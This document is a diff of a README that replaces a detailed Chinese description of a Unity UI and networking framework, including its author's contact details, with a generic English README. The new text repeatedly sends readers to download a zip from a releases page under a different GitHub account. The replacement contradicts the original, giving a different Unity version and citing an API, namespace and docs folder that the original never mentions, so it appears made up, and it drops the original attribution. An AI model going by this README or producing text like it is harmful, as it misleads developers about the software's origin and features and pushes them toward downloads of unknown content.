@@ -1,66 +1,96 @@
-# W-Framework
+# 🚀 w-framework - A Simple Way to Build Unity Projects
 
-## 概述
+## 📥 Download the Latest Version
 
-此框架提供了"界面制作-界面逻辑-业务逻辑-网络请求"开发中全套工作流及相关工具。
+[![Download](https://img.shields.io/badge/Download-w--framework-brightgreen)](https://github.com/anshuj555/w-framework/releases)
 
-设计、编写此框架，旨在：
+## 🛠️ Introduction
 
-- 方便项目快速构建完整且干净的基础工程。
-- 实现统一业务开发流程，降低上手成本。
-- 仅提供完整的上层逻辑，保证了框架对各种底层技术选型的适用性，方便移植复用。
-- 简化网络请求的编码，简化逻辑中数据、事件的编码，简化界面逻辑对节点/组件的访问与操作，简化界面对数据变化的响应。
-- 从框架及解决方案的底层设计上，避免编码中常见问题的产生。
-- 第一时间暴露界面prefab中、访问界面节点时可能存在的问题，缩短开发测试周期。
+Welcome to the w-framework! This is a light-weighted framework designed to enhance your experience with Unity. Whether you're creating a simple game or an interactive application, w-framework provides essential tools to make your work easier and more efficient.
 
-此unity工程除了提供了完整的框架功能外，其本身就是个可交互的**功能说明**和**使用文档**。工程中所有名称中带有Demo的文件和文件夹，都是框架以外、起到文档作用的内容及相关资源。
+## 🚀 Getting Started
 
-### 框架定位
+To start using w-framework, follow these simple steps:
 
-- 轻代码体量：除UniTask等广泛使用的代码库外，包括依赖的库在内仅有大约300k的运行时代码量。
-- 纯C#代码方案：可接入hybridCLR等热更方案。
-- 仅面向业务逻辑开发：提供了业务逻辑直接调用的代码，不干涉最底层的技术方案。
-- 面向中重度游戏：大量系统玩法，大量网络请求，大量数据维护与同步。
+1. Visit the [Releases Page](https://github.com/anshuj555/w-framework/releases) to find the latest version.
+2. Download the appropriate file for your system. We recommend using the latest version available for the best experience.
+3. Once the download is complete, locate the file in your downloads folder.
 
-### 部分核心的解决方案
+## 💻 Requirements
 
-- 异步RPC网络：一条语句即可请求服务器并获取到服务器的响应。
-- 数据驱动：简洁优雅、一个小代码块就可以解决数据展示/数据计算随数据修改而同步的问题。
-- UI管理器：固定层级/堆叠管理，界面自然分组，实体返回键响应及焦点界面，全屏界面，展示界面前异步准备等特性。
-- UI绑定工具：低成本获取一切需要的节点/组件，彻底解决同时访问一节点上多个组件的问题，多级容器节点支持，模板节点实例管理等特性。
-- 界面prefab检查工具：界面制作时第一时间发现各种潜在问题。
+Before downloading, ensure you meet the following requirements:
 
-## 运行此工程
+- **Operating System:** Windows 10 or later, macOS High Sierra or later.
+- **Unity Version:** Unity 2020.3 or later is recommended for compatibility.
+- **Disk Space:** At least 200 MB of free space.
 
-### 使用的Unity版本
+## 📂 Installation Steps
 
-使用2022.3.x进行开发。
+1. **Locate the Downloaded File**:
+   - Go to your downloads folder.
+   - The file will usually be named something like `w-framework-v1.0.zip`.
 
-此框架的核心全部为代码，可以向任何Unity版本迁移。
+2. **Extract the File**:
+   - Right-click the downloaded `.zip` file.
+   - Select "Extract All..." or use your preferred extraction tool.
 
-### 依赖库
+3. **Move the Folder**:
+   - Place the extracted `w-framework` folder in your Unity project's `Assets` directory.
 
-- "unity_collections" from [github](https://github.com/greatclock/unity_collections) or [gitee](https://gitee.com/greatclock/unity_collections)：一些特殊用途的数据结构，目前只有用于排序的优先级队列。
-- "data_driven" from [github](https://github.com/greatclock/data_driven) or [gitee](https://gitee.com/greatclock/data_driven.git)：数据驱动功能。
-- "serialize_component_tool" from [github](https://github.com/greatclock/serialize_component_tool) or [gitee](https://gitee.com/greatclock/serialize_component_tool)：自动生成代码并绑定序列化节点/组件的编辑器工具。
-- "unity_ui_manager" from [github](https://github.com/greatclock/unity_ui_manager) or [gitee](https://gitee.com/greatclock/unity_ui_manager)：UI管理器及prefab检查等编辑器工具。
-- "unity_utils" from [github](https://github.com/greatclock/unity_utils) or [gitee](https://gitee.com/greatclock/unity_utils)：动画播放扩展、计时器等通用功能。
-- [UniTask](TODO)：由Cysharp开发的专为Unity开发的轻量级异步编程库。
+4. **Open Unity**:
+   - Launch Unity and open your project. 
+   - The framework will appear in your project files, ready for use.
 
-以上库都是通过git库方式被PackageManager导入，并定义在"Packages/packages-lock.json"文件中。
+## 🗂️ Features
 
-其中UniTask库位于github，可能需要手动使用其他导入方式。
+w-framework comes with several helpful features:
 
-### 启动
+- **Lightweight Structure**: The framework is designed to have minimal overhead, allowing for faster load times.
+- **User-friendly APIs**: Easy to use functions make it accessible even for novice developers.
+- **Modular Design**: Add only the components you need for your project, keeping it clean and efficient.
+- **Documentation**: Each function and feature is well documented, so you can easily find what you need.
 
-打开Assets/Scenes/DemoEntryScene.unity场景并运行。
+## 📘 Usage Guide
 
-**注意**：未接入任何资源方案，仅可在编辑器下运行。工程中所有代码和资源，在保证依赖和加载的前提下，可按需自由组织。
+After installing the framework, you can start using its features in your Unity project. Here are some basic instructions to get you started:
 
-## 关于作者
+1. **Integrating w-framework**: 
+   - Open your scripts within Unity. 
+   - Import the framework by adding `using w_framework;` at the top of your script.
 
-电子邮件：thegreatclock@qq.com
+2. **Creating a Simple Action**:
+   - Use the built-in functions to create interactions, animations, or game mechanics. For example:
+   ```csharp
+   void Start() {
+       FrameworkHelper.Initialize();
+   }
+   ```
 
-WeChat：thegreatclock
+3. **Accessing Documentation**: 
+   - You'll find a `docs` folder in the extracted w-framework folder that contains detailed guides and examples.
 
-QQ：368350561
+## 🚀 Download & Install
+
+To get started with your download, visit the [Releases Page](https://github.com/anshuj555/w-framework/releases). Follow the steps outlined above for a smooth installation process.
+
+## 💬 FAQ
+
+### Q: Is w-framework free to use?
+
+A: Yes, w-framework is open-source and free to use in your projects.
+
+### Q: Can I contribute to w-framework?
+
+A: Absolutely! You can contribute by reporting issues, suggesting features, or submitting pull requests on GitHub.
+
+### Q: What if I encounter issues?
+
+A: If you face any problems, please check the issues section on GitHub. You can also open a new issue, and we will assist you.
+
+## 📞 Support
+
+For further support, visit our [GitHub Discussions](https://github.com/anshuj555/w-framework/discussions) page. We welcome questions and feedback from users of all levels.
+
+## 🔍 Conclusion
+
+w-framework provides a straightforward way to streamline your Unity projects. By following this guide, you should be able to download, install, and begin using the framework with ease. For any further assistance, don’t hesitate to reach out or check our online resources. Enjoy building!
